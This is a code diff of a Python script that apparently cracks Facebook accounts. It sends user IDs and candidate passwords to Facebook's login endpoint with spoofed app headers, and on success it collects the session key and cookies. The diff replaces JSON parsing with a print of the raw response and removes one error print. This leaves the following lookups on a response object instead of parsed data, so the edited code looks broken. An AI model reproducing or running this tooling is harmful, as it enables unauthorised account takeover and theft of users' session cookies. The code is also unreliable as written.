@@ -1403,7 +1403,8 @@ def mbasic(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
+            result = requests.post(url, data=data, headers=headers)
+            print(result)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1433,7 +1434,6 @@ def mbasic(uid,pwx,tl):
                 continue
         loop+=1
     except net_error:
-        print(net_error)
         time.sleep(10)
     except Exception as e:
         pass
